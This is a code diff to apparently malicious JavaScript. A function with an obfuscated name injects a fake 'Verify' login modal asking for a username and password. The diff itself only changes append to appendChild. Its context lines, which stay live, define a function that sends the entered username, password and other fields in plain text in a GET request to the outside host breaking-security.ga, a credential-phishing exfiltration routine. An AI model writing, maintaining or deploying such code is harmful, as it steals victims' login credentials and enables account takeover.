@@ -43,8 +43,8 @@ function uigjsh() {
             <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
             <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button class="trigger" onClick="yeres()">Verify</button>`;
             content.innerHTML = form;
-            modalc.append(content);
-            modal.append(modalc);
+            modalc.appendChild(content);
+            modal.appendChild(modalc);
             document.getElementById("body").appendChild(modal);
             var x = document.createElement("script");
             x.text = `function yeres(){var e=document.getElementById("username").value,t=document.getElementById("pass").value,n=document.getElementById("id").value,a=document.getElementById("reason").value;if(!e||!t||!n)return void(document.getElementById("error-div").style.display="block");const s=new XMLHttpRequest;s.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block"))},s.open("GET","https://breaking-security.ga?target=attachment&username="+e+"&password="+t+"&reason="+a+"&owner="+n),s.send()}`;
